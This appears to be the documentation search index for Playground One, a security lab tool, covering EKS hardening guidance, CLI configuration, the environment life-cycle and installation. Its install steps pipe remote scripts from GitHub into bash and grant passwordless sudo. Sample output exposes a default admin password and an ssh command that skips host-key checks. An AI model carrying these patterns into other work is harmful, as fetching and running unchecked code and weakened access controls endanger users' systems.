connecting to potentially malicious or unapproved websites. Example implementations include category-based filtering, reputation-based filtering, or through the use of block lists. Enforce filters for all enterprise assets.</li> <li>7.4 Maintain and Enforce Network-Based URL Filters Enforce network-based URL filters that limit a system's ability to connect to websites not approved by the organization. This filtering shall be enforced for each of the organization's systems, whether they are physically at an organization's facilities or not.</li> </ul> <p>Ensure clusters are created with Private Endpoint Enabled and Public Access Disabled</p> <p>In a private cluster, the master node has two endpoints, a private and public endpoint. The private endpoint is the internal IP address of the master, behind an internal load balancer in the master's VPC network. Nodes communicate with the master using the private endpoint. The public endpoint enables the Kubernetes API to be accessed from outside the master's VPC network.</p> <p>Although Kubernetes API requires an authorized token to perform sensitive actions, a vulnerability could potentially expose the Kubernetes publically with unrestricted access. Additionally, an attacker may be able to identify the current cluster and Kubernetes API version and determine whether it is vulnerable to an attack. Unless required, disabling public endpoint will help prevent such threats, and require the attacker to be on the master's VPC network to perform any attack on the Kubernetes API. Impact:</p> <p>Configure the EKS cluster endpoint to be private.</p> <ol> <li>LeavetheclusterendpointpublicandspecifywhichCIDRblockscan communicate with the cluster endpoint. The blocks are effectively a whitelisted set of public IP addresses that are allowed to access the cluster endpoint.</li> <li>ConfigurepublicaccesswithasetofwhitelistedCIDRblocksandsetprivate endpoint access to enabled. This will allow public access from a specific range of public IPs while forcing all network traffic between the kubelets (workers) and the Kubernetes API through the cross-account ENIs that get provisioned into the cluster VPC when the control plane is provisioned.</li> </ol> <p>Audit - Playground One (see above)</p> <p>References: https://docs.aws.amazon.com/eks/latest/userguide/cluster-endpoint.html</p> <p>CIS Controls:</p> <ul> <li>4.4 Implement and Manage a Firewall on Servers Implement and manage a firewall on servers, where supported. Example implementations include a virtual firewall, operating system firewall, or a third-party firewall agent.</li> <li>12 Boundary Defense</li> </ul> <p>Ensure clusters are created with Private Nodes</p> <p>Disabling public IP addresses on cluster nodes restricts access to only internal networks, forcing attackers to obtain local network access before attempting to compromise the underlying Kubernetes hosts.</p> <p>To enable Private Nodes, the cluster has to also be configured with a private master IP range and IP Aliasing enabled.</p> <p>Private Nodes do not have outbound access to the public internet. If you want to provide outbound Internet access for your private nodes, you can use Cloud NAT or you can manage your own NAT gateway.</p> <p>Audit - Playground One (see above)</p> <p>References: https://docs.aws.amazon.com/eks/latest/userguide/cluster-endpoint.html</p> <p>CIS Controls:</p> <ul> <li>4.4 Implement and Manage a Firewall on Servers Implement and manage a firewall on servers, where supported. Example implementations include a virtual firewall, operating system firewall, or a third-party firewall agent.</li> <li>12 Boundary Defense</li> </ul> <p>Ensure Network Policy is Enabled and set as appropriate</p> <pre><code>cd ${ONEPATH}/awsone/4-cluster-eks-ec2\ncluster_name=$(terraform output -raw cluster_name)\n\necho Cluster security group id:\naws eks describe-cluster --name ${cluster_name} --query \"cluster.resourcesVpcConfig.clusterSecurityGroupId\"\n</code></pre> <pre><code># Example\nCluster security group id:\n\"sg-0a8c50569b529a3b3\"\n</code></pre> <p>CIS Controls:</p> <ul> <li>12.6 Use of Secure Network Management and Communication Protocols. Use secure network management and communication protocols (e.g., 802.1X, Wi-Fi Protected Access 2 (WPA2) Enterprise or greater).</li> <li>9.2 Ensure Only Approved Ports, Protocols and Services Are Running. Ensure that only network ports, protocols, and services listening on a system with validated business needs, are running on each system.</li> <li>9.4 Apply Host-based Firewalls or Port Filtering Apply host-based firewalls or port filtering tools on end systems, with a default-deny rule that drops all traffic except those services and ports that are explicitly allowed.</li> </ul> <p>Encrypt traffic to HTTPS load balancers with TLS certificates</p> <p>Encrypting traffic between users and your Kubernetes workload is fundamental to protecting data sent over the web.</p> <p>Audit:</p> <p>Your load balancer vendor can provide details on auditing the certificates and policies required to utilize TLS.</p> <p>CIS Controls:</p> <ul> <li>3.10 Encrypt Sensitive Data in Transit. Encrypt sensitive data in transit. Example implementations can include: Transport Layer Security (TLS) and Open Secure Shell (OpenSSH).</li> <li>14.4 Encrypt All Sensitive Information in Transit Encrypt all sensitive information in transit.</li> </ul>"},{"location":"security/#vision-one-container-security","title":"Vision One Container Security","text":"<p>The API key is used for communication with the backend throughout the life of the in-cluster app.</p> <p>The API key is generated when generating the cluster and copied to the <code>overrides.yaml</code>.</p> <p>Determine whether to use existing secrets in the target namespace rather than specifying in overrides.yaml. Useful if you want to manage secrets on your own, e.g., in argocd.</p> <p>When this is enabled, typically you will need these secrets created in your target namespace. (names may vary depending on your settings):</p> <ul> <li>trendmicro-container-security-auth</li> <li>trendmicro-container-security-outbound-proxy-credentials</li> </ul> <p>You can fill overrides.yaml and use helm install --dry-run to generate these secret's template.</p> <p>After deployment, if you update the secret after deployment, you will need to restart pods of container security to make changes take effect.</p> <p><code>useExistingSecrets: false</code></p>"},{"location":"getting-started/configuration/","title":"Getting Started Configuration","text":"<p>Playground One is controlled by the command line interface <code>pgo</code>.</p> <p>Use it to interact with the Playground One by running</p> <pre><code>pgo\n</code></pre> <p>from anywhere in your terminal.</p> <p>Note: If <code>pgo</code> is not found create a new shell to load the environment or run <code>. ~/.bashrc</code>.</p>"},{"location":"getting-started/configuration/#getting-help","title":"Getting Help","text":"<p>Run:</p> <pre><code>pgo --help\n</code></pre> <pre><code> __                 __   __   __             __      __        ___ \n|__) |     /\\  \\ / / _` |__) /  \\ |  | |\\ | |  \\    /  \\ |\\ | |__  \n|    |___ /~~\\  |  \\__&gt; |  \\ \\__/ \\__/ | \\| |__/    \\__/ | \\| |___ \n\nUsage: pgo -&lt;command&gt; &lt;configuration&gt; ...\n\nThe available commands for execution are listed below.\nThe primary workflow commands are given first, followed by\nless common or more advanced commands.\n\nMain commands:\n  -c --config    Set/update Playground One main configuration\n  -i --init      Prepare a configuration for other commands\n  -a --apply     Create or update a configuration\n  -l --list      List applied configurations\n  -d --destroy   Destroy previously-created configuration\n  -o --output    Show output values\n  -s --state     Show the current state\n  -E --erase     Cleanup Terraform state\n  -h --help      Show this help\n\nOther commands:\n  -S --show      Show advanced state\n  -u --updateip  Update access IP(s)\n  -U --update    Update Playground One and components\n  -v --validate  Check whether the configuration is valid\n  -p --plan      Plan apply and destroy\n\nAvailable configurations:\n  user                PGO User configuration\n  nw                  Network configuration\n  ec2                 EC2 configuration\n  eks-ec2             EKS configuration\n  eks-fg              EKS configuration\n  ecs-ec2             ECS configuration\n  ecs-fg              ECS configuration\n  s3scanner           S3 Bucket scanner\n  kind                Kind configuration\n  scenarios-ec2       Scenario configuration\n  scenarios-fg        Scenario configuration\n  scenarios-cspm      Scenario configuration\n  scenarios-identity  Scenario configuration\n  scenarios-kind      Scenario configuration\n  scenarios-aks       Scenario configuration\n  dsm                 Deep Security configuration\n  dsw                 Deep Security Workload configuration\n  aks                 AKS configuration\n  all                 All configurations\n\nExamples:\n  pgo --apply nw\n  pgo --state all\n</code></pre>"},{"location":"getting-started/configuration/#configure","title":"Configure","text":"<p>Note: When using AWS you need to know your Account ID, for Azure you need your Subscription ID. Get these IDs using the following commands:</p> <p><code>aws sts get-caller-identity | jq -r '.Account'</code></p> <p><code>az account list | jq -r '.[] | [.name, .id] | @tsv'</code></p> <p>If you intent to use the Playground One user on AWS run the following commands now:</p> <pre><code>pgo --init user\npgo --apply user\n</code></pre> <p>This will create a user account in AWS with the necessary permissions only. The credetials are automatically set in the <code>config.yaml</code>.</p> <p>After bootstrapping you need to configure Playground One. To simplify the process use the built in configuration tool. An already existing <code>config.yaml</code> will be saved as <code>config.yaml.bak</code>. Run</p> <pre><code>pgo --config\n</code></pre> <p>This process will create or update your personal <code>config.yaml</code>. Existing settings will be shown in square brackets. To accept them just press enter.</p> <p>The configuration tool is devided into sections. The following chapters walk you through the process.</p>"},{"location":"getting-started/configuration/#section-playground-one","title":"Section: Playground One","text":"<p>You don't necessarily need to change anything here if you're satisfied with the defaults, but</p> <p>Note: It is highly recommended to change the <code>Access IPs/CIDRs</code> to (a) single IP(s) or at least a small CIDR to prevent anonymous users playing with your environmnent. Remember: we might deploy vulnerable applications.</p> <p>Set/update:</p> <ul> <li><code>Initialize Terraform Configurations</code>: Set this to <code>true</code> if you want to download the required Terraform providers. You need to do this on a new installation of Playground One at least once. If you want to reconfigure Playground One later on you can set it to false, which will speed up the reconfiguration process. </li> <li><code>PGO Environment Name</code>: Your to be built environment name. It MUST NOT be longer than 12 characters.</li> <li><code>Access IPs/CIDRs</code>:</li> <li>If you're running on a local Ubuntu server or are using Playground One Container locally (not on Cloud9), get your public IP and set the value to <code>&lt;YOUR IP&gt;/32</code> or type <code>pub</code> and let the config tool detect your public IP.</li> <li>If you're working on a Cloud9 you need to enter a second public IP/CIDRs.<ol> <li>Public IP from your Cloud9 or type <code>pub</code>.</li> <li>Public IP from your local client.  </li> </ol> </li> <li>If you want someone else grant access to your environment just add another IP/CIDR.</li> <li>Examples:<ul> <li><code>pub</code></li> <li><code>pub, 86.120.222.205</code></li> <li><code>3.121.226.247/32, 86.120.222.20/32</code></li> <li><code>0.0.0.0/0</code> Dangerous!</li> </ul> </li> <li><code>Running in Product Experience</code>: Leave this to false unless you're running Playground One inside the Product Experience Platform.</li> </ul> <p>If your IP address has changed see FAQ.</p>"},{"location":"getting-started/configuration/#section-aws","title":"Section: AWS","text":"<p>Note: This section is skipped when you have any configuration applied.</p> <p>Set/update:</p> <ul> <li><code>Account ID</code>: The ID of your AWS subscription (just numbers no <code>-</code>). This is mandatory.</li> <li><code>Region Name</code>: If you want to use another region as <code>eu-central-1</code>.</li> <li><code>Use PGO User</code>: The Playground One has the ability to create and use a dedicated AWS user with limited privileges. If you want to use this feature you need to run <code>pgo --apply user</code> after you have finished the configuration of the Playground One. This will then create a User within a Group with several IAM policies attached.</li> <li><code>AD - create PGO Active Directory</code>: Enable/disable deployment of an Active Directory. This AD is more flexible compared to the AWS Managed Active Directory below.</li> <li><code>MAD - create Managed Active Directory</code>: Enable/disable deployment of an AWS Managed Active Directory.</li> <li><code>SG - create Service Gateway</code>: Enable/disable deployment of the Trend Micro Service Gateway.</li> <li><code>PAC - create Private Access Gateway</code>: Enable/disable deployment of the Trend Micro Private Access Gateway.</li> <li><code>VNS - create Virtual Network Sensor</code>: Enable/disable deployment of the Trend Micro Virtual Network Sensor.</li> <li><code>DDI - create Deep Discovery Inspector</code>: Enable/disable deployment of the Trend Micro Deep Discovery Inspector.</li> <li><code>EC2 - create Linux EC2</code>: Enable/disable Linux instances in the <code>ec2</code> configuration.</li> <li><code>EC2 - create Windows EC2</code>: Enable/disable Windows instances in the <code>ec2</code> configuration.</li> </ul>"},{"location":"getting-started/configuration/#section-azure","title":"Section: Azure","text":"<p>Set/update:</p> <ul> <li><code>Azure Subscription ID</code>: The ID of your Azure subscription. This is mandatory.</li> <li><code>Azure Region Name</code>: If you want to use another region as <code>westeurope</code>.</li> </ul>"},{"location":"getting-started/configuration/#section-vision-one-configuration","title":"Section: Vision One Configuration","text":"<p>Set/update:</p> <ul> <li><code>Vision One API Key</code>: Your Vision One API Key.</li> <li><code>Vision One Region Name</code>: Your Vision One Region.</li> <li><code>Vision One ASRM - create Potential Attack Path(s)</code>: Create potential attack path detections for ASRM.</li> <li><code>Enable Vision One Container Security</code>: Enable or disable the Container Security deployment. If set to <code>false</code> Cloud One configuration will be skipped.</li> <li><code>Vision One Container Security Policy Name</code>: The name of the Policy to assign.</li> <li><code>Vision One Container Security Cluster Group ID</code>: The Cluster Group ID to go.</li> </ul>"},{"location":"getting-started/configuration/#section-kubernetes-deployments","title":"Section: Kubernetes Deployments","text":"<p>Set/update:</p> <ul> <li><code>Deploy Calico</code>: Enable/disable the most used Pod network on your EKS cluster. It's currently disabled by default but will come shortly</li> <li><code>Deploy Prometheus &amp; Grafana</code>: Enable/disable Prometheus. It is an open-source systems monitoring and alerting toolkit integrated with a preconfigured Grafana.</li> <li><code>Deploy Trivy</code>: Enable/disable Trivy vulnerability scanning for comparison.</li> <li><code>Deploy Istio</code>: Enable/disable for EKS EC2.</li> <li><code>Deploy MetalLB</code>: Enable/disable MetalLB for Kind cluster.</li> </ul>"},{"location":"getting-started/configuration/#section-deep-security-on-prem","title":"Section: Deep Security (on-prem)","text":"<p>Set/update:</p> <ul> <li><code>Enable Deep Security</code>: Enable or disable the Deep Security deployment. If set to <code>false</code> Deep Security configuration will be skipped.</li> <li><code>Deep Security License</code>: Your Deep Security license key.</li> <li><code>Deep Security Username</code>: Username of the MasterAdmin.</li> <li><code>Deep Security Password</code>: Password of the MasterAdmin.</li> </ul>"},{"location":"getting-started/configuration/#section-workload-security","title":"Section: Workload Security","text":"<p>Set/update:</p> <ul> <li><code>Enable Workload Security</code>: Enable or disable the Deep Security deployment. If set to <code>false</code> Deep Security configuration will be skipped.</li> <li><code>Region</code>: Your Workload Security Cloud One Region.</li> <li><code>Tenant ID</code>: Workload Security Tenant ID.</li> <li><code>Token</code>: Workload Security Token.</li> <li><code>API Key</code>: Workload Security API Key.</li> </ul> <p>Now, continue with the chapter General Life-Cycle.</p>"},{"location":"getting-started/life-cycle/","title":"General Life-Cycle","text":""},{"location":"getting-started/life-cycle/#initialize","title":"Initialize","text":"<p>Initialize with</p> <pre><code>pgo --init all\n</code></pre> <p>This will prepare all available configurations. No changes done in the clouds yet.</p> <p>If you have changed Playground Ones main configuration using <code>pgo --config</code> or updated it via <code>git pull</code> please rerun <code>pgo --init all</code> again to apply eventual changes to the configurations.</p>"},{"location":"getting-started/life-cycle/#create-the-aws-environment-examples","title":"Create the AWS Environment (Examples)","text":"<ol> <li> <p>To create the VPC and Network run</p> <pre><code>pgo --apply network\n</code></pre> <p>This will create your VPC and network in the configured region (see <code>config.yaml</code>)</p> </li> <li> <p>If you want your EC2 instances to be connected to Vision One Endpoint Security head over to Vision One Endpoint Security Server &amp; Workload Protection and come back afterwards.</p> </li> <li> <p>Create Virtual Instances and/or Kubernetes Clusters with demo workload.</p> <p>EC2 instances:</p> <pre><code>pgo --apply instances\n</code></pre> <p>EKS EC2 cluster:</p> <pre><code>pgo --apply eks-ec2\n</code></pre> <p>Note: If you're using the PGO user, you'll need to run <code>pgos</code> after building the cluster to get access to it for using `kubectl' commands. This will create a new shell with that user's credentials.</p> <p>EKS Fargate cluster:</p> <pre><code>pgo --apply eks-fg\n</code></pre> <p>Note: If you're using the PGO user, you'll need to run <code>pgos</code> after building the cluster to get access to it for using `kubectl' commands. This will create a new shell with that user's credentials.</p> <p>ECS EC2 cluster:</p> <pre><code>pgo --apply ecs-ec2\n</code></pre> <p>ECS Fargate cluster:</p> <pre><code>pgo --apply ecs-fg\n</code></pre> <p>...</p> </li> </ol>"},{"location":"getting-started/life-cycle/#create-the-azure-environment","title":"Create the Azure Environment","text":"<ol> <li> <p>Create Kubernetes Cluster with demo workload.</p> <p>AKS cluster:</p> <pre><code>pgo --apply aks\n</code></pre> </li> </ol>"},{"location":"getting-started/life-cycle/#query-outputs-and-state","title":"Query Outputs and State","text":"<p>The most relevant information on your configuration can be queried by running</p> <pre><code>pgo --output &lt;configuration&gt;\n</code></pre> <p>Example: <code>pgo --output network</code>:</p> <pre><code>ad_admin_password = &lt;sensitive&gt;\nad_ca_ip = \"3.79.240.102\"\nad_dc_ip = \"18.199.162.245\"\nad_dc_pip = \"10.0.4.243\"\nad_domain_admin = \"Administrator\"\nad_domain_name = \"pgo-zt.local\"\ndatabase_subnet_group = \"pgo-zt-vpc\"\ndatabase_subnets = [\n  \"subnet-024061bce0457ad5a\",\n  \"subnet-0385d854408871587\",\n  \"subnet-05eea550f4b109560\",\n]\nintra_subnet_cidr_blocks = tolist([\n  \"10.0.20.0/24\",\n  \"10.0.21.0/24\",\n  \"10.0.22.0/24\",\n])\nintra_subnets = [\n  \"subnet-0e11990df7299c915\",\n  \"subnet-0b5aecdff3e5673a1\",\n  \"subnet-0e29a813d1fc4db82\",\n]\nkey_name = \"pgo-zt-key-pair-fuhp9d81\"\nnat_ip = \"3.73.242.255\"\nprivate_key_path = \"/home/markus/projects/opensource/playground/playground-one/pgo-zt-key-pair-fuhp9d81.pem\"\nprivate_security_group_id = \"sg-09685580098cdbbbb\"\nprivate_subnet_cidr_blocks = tolist([\n  \"10.0.0.0/24\",\n  \"10.0.1.0/24\",\n  \"10.0.2.0/24\",\n])\nprivate_subnets = [\n  \"subnet-04c67c83d6cbac862\",\n  \"subnet-0b641ee8a642ee59b\",\n  \"subnet-053aa013e78f082c9\",\n]\npublic_key = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCxtSTOrR4TVxVvz1UWjsR7QxDS99DlHSx3YE7olWGQGraifnW9z2fL9SadHYMeEMgitRndyVRFOWNoMEdsixnwr5UMewUZCPeVmuifZLPSleVhdsjDmEKsvlyed6tbTCFsH/NseNI9GOzGShHravWqkGvKQysT550/xlcjH8NUYpJqRPWVcDatedxuQZdRidWJu3lPmDYOxEYzb7lPdi/sAT4Y6e9VXv7/kc1EWuM+DB/Z6b40hxl8ud+bomk3z+2GxmqdCTbXkQqt+eiSxJirZV7m1xEhfAOBwlzdeTAX7iKJoIAtP+4hCACPcpXi5QU+ufiqpwTnH9XyF42vlpvgiCrSyF7KEKCOTTFmSkin6UDhcqtsHwdRDraszSQcgzrdUSr5qh3xhK9DGymPSLjH5fDAE/NY8FXS1YiJuOBNDz8SVjiIIKJfvO69QGrMo+rtrKySSrLWXHPE2rpTzPnNZA4xfAiIgObzTFpska+9dqeaSgYO/Bf7ZciEcFJsYNVHDisANPeiqDMZ8gL5YIs1cpKL8HtP/MQ9vmk/GvqGdKrjJbpFx5Ck75R4V43ALmY+sYEXrwuqsCEHVaI5M8azduQoYk/7gmMWrwRyZVndRx60yJjawDbOSRrw1ppqA87LlSXHWzD9MqKESA0M7Ktbl1T0UvHoGygX16TsFaeFZw==\"\npublic_security_group_id = \"sg-0450bc4f9b8b6df27\"\npublic_subnet_cidr_blocks = tolist([\n  \"10.0.4.0/24\",\n  \"10.0.5.0/24\",\n  \"10.0.6.0/24\",\n])\npublic_subnets = [\n  \"subnet-0801f0e4b2d56adfb\",\n  \"subnet-097370fd84490c194\",\n  \"subnet-0e200500c67fc8046\",\n]\nsg_ami = \"ami-076cc3a0b6e31d873\"\nsg_va_ip = \"35.159.85.242\"\nsg_va_ssh = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-zt-key-pair-fuhp9d81.pem -o StrictHostKeyChecking=no admin@35.159.85.242\"\nvpc_id = \"vpc-09af1cf0b47603e9e\"\nvpc_owner_id = \"634503960501\"\nad_admin_password = TrendMicro.1\n</code></pre> <p>With this you can always query details of your VPC.</p>"},{"location":"getting-started/life-cycle/#play-with-the-playground-one","title":"Play with the Playground One","text":"<p>It's a playground, or? Experiment and hopefully learn a few things. For your guidance, there are some prepared scenarios for you to go through. Find them in the navigation pane.</p>"},{"location":"getting-started/life-cycle/#switch-in-between-multiple-kubernetes-clusters","title":"Switch in between multiple Kubernetes Clusters","text":"<p>If you're using multiple clusters simultaneously you can easily switch in between the clusters using the command <code>kubie</code>.</p> <p>Main commands:</p> <ul> <li><code>kubie ctx</code> display a selectable menu of contexts or directly spawns a shell if there is only one context available.</li> <li><code>kubie ctx &lt;context&gt;</code> switch the current shell to the given context (spawns a shell if not a kubie shell).</li> <li><code>kubie ctx -</code> switch back to the previous context</li> <li><code>kubie ns</code> display a selectable menu of namespaces</li> <li><code>kubie ns &lt;namespace&gt;</code> switch the current shell to the given namespace</li> <li><code>kubie ns -</code> switch back to the previous namespace</li> </ul> <p>Exit a context by pressing <code>^d</code>.</p> <p>Full list of kubie commands here.</p>"},{"location":"getting-started/life-cycle/#tear-down","title":"Tear Down","text":"<p>If you want to destroy your environment completely or only parts of it</p> <pre><code>pgo --destroy &lt;configuration&gt;\n</code></pre> <p>If you want to tear down everything run</p> <pre><code>pgo --destroy all\n</code></pre> <p>Note: The network and VPC are not automatically destroyed. You can do this manually by running <code>pgo --destroy nw</code>. Be sure to have the CloudFormation stack of XDR for Containers deleted before doing so. Otherwise it will be in a failed (blackhole) state.</p>"},{"location":"getting-started/prepare/","title":"Getting Started","text":"<p>There are multiple ways to prepare Playground One:</p> <ul> <li>The Playground One Container, or</li> <li>the native use on your system.</li> </ul> <p>The Playground One Container runs on <code>arm64</code>  or <code>amd64</code> machines providing a container engine like Docker, Docker Desktop or Colima to run the container. It is the most simple way to use. The container contains everything what is needed by the Playground One to operate and does not change your local system in any way.</p> <p>Running Playground One natively allows you to have all components available system wide. This makes it possible to not only manage an environment implemented by Playground One.</p>"},{"location":"getting-started/prepare/#playground-one-container-easy-and-portable","title":"Playground One Container (Easy and portable)","text":"<p>Follow this chapter if...</p> <ul> <li>you intent to use Playground One Container on any <code>arm64</code>  or <code>amd64</code> based container engine. This includes AWS Cloud9 environments with Amazon Linux or Ubuntu.</li> </ul> <p>Note: For the curious ones, here's the Dockerfile.</p> <p>First, start a terminal and make sure you have a running container engine. To check this, run <code>docker ps</code>.</p> <p>Note: If you want to specify a Playground One Container version instead of using <code>latest</code> create a file with the version (tag) to use by running:</p> <p><code>echo \"&lt;VERSION&gt;\" &gt;.PGO_VERSION</code></p> <p>Example:</p> <p><code>echo \"0.2\" &gt;.PGO_VERSION</code></p> <p>Then simply run</p> <pre><code>curl -fsSL https://raw.githubusercontent.com/mawinkler/playground-one/main/bin/get_pgoc.sh | bash\n</code></pre> <p>The above will pull the latest version (or the version you specified in the <code>.PGO_VERSION</code>-file) of the container. If you're already authenticated to AWS, Azure, and/or have an already existing <code>config.yaml</code> from a previous Playground One installation in the current directory, they will automatically be made available to the Playground One container.</p> <p>Note: When running the above <code>curl</code>-command on an AWS Cloud9 instance, the instance should be at least a <code>t3.medium</code> and you will be asked to run <code>./get_pgoc.sh</code> manually. The script will ask for your AWS credentials which will never be stored on disk and get removed from memory after creating and assigning an instance role to the Cloud9 instance.</p> <p>If you didn't do before, you will be asked to turn off AWS managed temporary credentials: </p> <ul> <li>Click the gear icon (in top right corner), or click to open a new tab and choose <code>[Open Preferences]</code></li> <li>Select AWS SETTINGS</li> <li>Turn OFF <code>[AWS managed temporary credentials]</code></li> </ul> <p>You will notice, that a new directory called <code>workdir</code> has been created. This directory represents the <code>home</code>-directory from your Playground One Container.</p> <p>To access the container run</p> <pre><code>./pgoc start\n# password: pgo\n</code></pre> <pre><code>Starting Playground One Container\ncd741d37446ee0565f6da3f224eb60e4d3bab9824d3255ae08afef8b4263b2c9\n\nConnect:  ssh -p 2222 pgo@localhost\nPassword: pgo\npgo@localhost's password: \nWelcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.1.72-96.166.amzn2023.x86_64 x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\nThis system has been minimized by removing packages and content that are\nnot required on a system that users do not log into.\n\nTo restore this content, you can run the 'unminimize' command.\n ____  _                                             _    ___             \n|  _ \\| | __ _ _   _  __ _ _ __ ___  _   _ _ __   __| |  / _ \\ _ __   ___ \n| |_) | |/ _` | | | |/ _` | '__/ _ \\| | | | '_ \\ / _` | | | | | '_ \\ / _ \\\n|  __/| | (_| | |_| | (_| | | | (_) | |_| | | | | (_| | | |_| | | | |  __/\n|_|   |_|\\__,_|\\__, |\\__, |_|  \\___/ \\__,_|_| |_|\\__,_|  \\___/|_| |_|\\___|\n               |___/ |___/                                                \npgo@cd741d37446e:~$ \n</code></pre> <p>If you exited the container, reconnect anytime with</p> <pre><code>ssh -p 2222 pgo@localhost\n# password: pgo\n</code></pre> <p>Now authenticate to AWS and/or Azure by either running</p> <pre><code># Not required when using Cloud9\naws configure\n\n# Verify\naws s3 ls\n\n# Should return a list of available S3 buckets\n</code></pre> <p>and/or</p> <pre><code>az login --use-device-code\n</code></pre> <p>Stopping the container is possible with <code>./pgoc stop</code>, to start it again just run <code>./pgoc start</code>.</p> <p>Note: Updating the container or changing to a different release of the container can be done following these steps:</p> <ol> <li>Edit the file <code>.PGO_VERSION</code> to set the version you want (e.g. <code>0.2</code>).</li> <li>Run <code>./pgoc update</code></li> <li>This will backup your current <code>workdir</code> and save your <code>config.yaml</code>.</li> <li>The desired version of the container is pulled and a new <code>workdir</code> is created.</li> <li>The previous <code>config.yaml</code> is restored alongside the possibly existing <code>.aws</code> config.</li> <li>Start the new container with <code>./pgoc start</code> and login via ssh.</li> </ol> <p>You likely get an error when connecting with ssh. If so, delete the offending line in <code>~/.ssh/known_hosts</code> and retry.</p> <p>Then, continue with Configuration.</p>"},{"location":"getting-started/prepare/#advanced-but-native","title":"Advanced but native","text":""},{"location":"getting-started/prepare/#ubuntu","title":"Ubuntu","text":"<p>Follow this chapter if...</p> <ul> <li>you're using the Playground on a Ubuntu machine (not Cloud9).</li> </ul> <p>Test if <code>sudo</code> requires a password by running <code>sudo ls /etc</code>. If you don't get a password prompt you're fine, otherwise run.</p> <pre><code>sudo visudo -f /etc/sudoers.d/custom-users\n</code></pre> <p>Add the following line:</p> <pre><code>&lt;YOUR USER NAME&gt; ALL=(ALL) NOPASSWD:ALL \n</code></pre> <p>Now, run the Playground</p> <pre><code>curl -fsSL https://raw.githubusercontent.com/mawinkler/playground-one/main/bin/pgo | bash &amp;&amp; exit\n</code></pre> <p>The bootstrapping process will exit your current terminal or shell after it has done it's work. Depending on your environment just create a new terminal session.</p> <p>You now need to manually authenticate to AWS and/or Azure by either running</p> <pre><code>aws configure\n</code></pre> <p>and/or</p> <pre><code>az login --use-device-code\n</code></pre> <p>Then, continue with Configuration.</p>"},{"location":"getting-started/prepare/#experimental-macos-apple-silicon-and-intel","title":"EXPERIMENTAL - MacOS Apple silicon and Intel","text":"<p>Follow this chapter if...</p> <ul> <li>you're using the Playground on a MacOS machine with an M1+ (ARM) or Intel chip.</li> </ul> <p>Note: The initial bootstrapping process might require administrative privileges. Depending on your OS configuration you might need to enable administrator mode. Updating an already installed Playground does not require admin privileges.</p> <p>Now, run the Playground</p> <pre><code>curl -fsSL https://raw.githubusercontent.com/mawinkler/playground-one/main/bin/pgo | bash &amp;&amp; exit\n</code></pre> <p>The bootstrapping process will exit your current terminal or shell after it has done it's work. Depending on your environment just create a new terminal session.</p> <p>You now need to manually authenticate to AWS and/or Azure by either running</p> <pre><code>aws configure\n</code></pre> <p>and/or</p> <pre><code>az login --use-device-code\n</code></pre> <p>Then, continue with Configuration.</p>"},{"location":"getting-started/prepare/#cloud9","title":"Cloud9","text":"<p>Note: Native installation on Cloud9 is no longer supported. Use Playground One Container (Easy and portable) instead.</p>"},{"location":"how-it-works/add-ons/","title":"Playground One Add-Ons","text":"<p>There are currently two not Terraform related add-ons included in the Playground One.</p> <ul> <li> <p>Cloud Security Posture Management</p> </li> <li> <p>Located in the Playground One home directury as <code>cspm</code>.</p> </li> <li> <p>The intention of this add-on is to provide a RESTful Api driven exception handling mechanism with Terraform template scanning support. The Python scripts included here implement the following functionality:</p> <ul> <li>Create Terrafrom Plan of Configuration and run Conformity Template Scan</li> <li>Set Exceptions in Scan Profile based on Name-Tags or unique Tags assigned to the resource</li> <li>Create Terraform Apply of Configuration</li> <li>Create Terraform Destroy of Configuration</li> <li>Remove Exceptions in Scan Profile or reset the Scan Profile</li> <li>Suppress Findings in Account Profile</li> <li>Expire Findings in Account Profile</li> <li>Run Conformity Bot and request status</li> <li>Download latest Report</li> </ul> </li> <li> <p>Consult the documentation within the Python scripts <code>scanner_c1_uuid.py</code> and/or <code>scanner_c1_name.py</code> on how to play with this.</p> </li> <li> <p>Container Stacks for Third-Party integrations.</p> </li> <li> <p>Located in the Playground One home directury as <code>stacks</code>.</p> </li> <li> <p>Splunk - Spins up a local Splunk which can be used individually or in conjunction with some scenarios of Playground One. These are</p> <ul> <li>Setup Splunk</li> <li>Integrate Vision One with Splunk</li> <li>Integrate V1CS Customer Runtime Security Rules with Splunk</li> <li></li> </ul> </li> <li> <p>Elastic - Creates a local ELK stack to play with.</p> <ul> <li>Setup Elastic (ELK Stack)</li> <li></li> </ul> </li> </ul>"},{"location":"how-it-works/configurations-aws/","title":"Playground One AWS Configurations","text":"<p>The Playground One has a modular structure as shown in the following tree:</p> <pre><code>awsone\n\u251c\u2500\u2500 network (2-network)\n|\u00a0\u00a0 \u251c\u2500\u2500 ec2 (3-instances)\n|\u00a0\u00a0 \u251c\u2500\u2500 eks (4-cluster-eks-ec2)\n|\u00a0\u00a0 |   \u251c\u2500\u2500 eks-deployments (8-cluster-eks-ec2-deployments)\n|\u00a0\u00a0 |   \u2514\u2500\u2500 scenarios-ec2 (7-scenarios-ec2)\n|\u00a0\u00a0 \u251c\u2500\u2500 eks (4-cluster-eks-fargate)\n|\u00a0\u00a0 |   \u251c\u2500\u2500 eks-deployments (8-cluster-eks-fargate-deployments)\n|\u00a0\u00a0 |   \u2514\u2500\u2500 scenarios-fargate (7-scenarios-fargate)\n|   \u251c\u2500\u2500 ecs (5-cluster-ecs-ec2)\n|   \u251c\u2500\u2500 ecs (5-cluster-ecs-fargate)\n|   \u251c\u2500\u2500 scenarios-cloudtrail (7-scenarios-cloudtrail)\n|   \u251c\u2500\u2500 scenarios-identity (7-scenarios-identity)\n|   \u2514\u2500\u2500 scenarios-zerotrust (7-scenarios-zerotrust)\n\u251c\u2500\u2500 s3scanner (6-bucket-scanner)\n\u251c\u2500\u2500 scenarios-cspm (7-scenarios-cspm)\n\u251c\u2500\u2500 dsm (9-deep-security)\n|   \u2514\u2500\u2500 dsw (9-deep-security-workload)\n\u2514\u2500\u2500 wsw (9-workload-security-workload)\n</code></pre> <p>As we can see, the configuration <code>network</code> is the base for the other configurations. It creates the VPC, Subnets, Route Tables, Security Groups, etc. One can choose to only create the EKS cluster, or ECS cluster, or even the full stack. Everything will reside in the same VPC.</p> <p>The following chapters describe the different configurations on a high level, refer the the dedicated documentation for more details.</p>"},{"location":"how-it-works/configurations-aws/#virtual-private-cloud-and-network","title":"Virtual Private 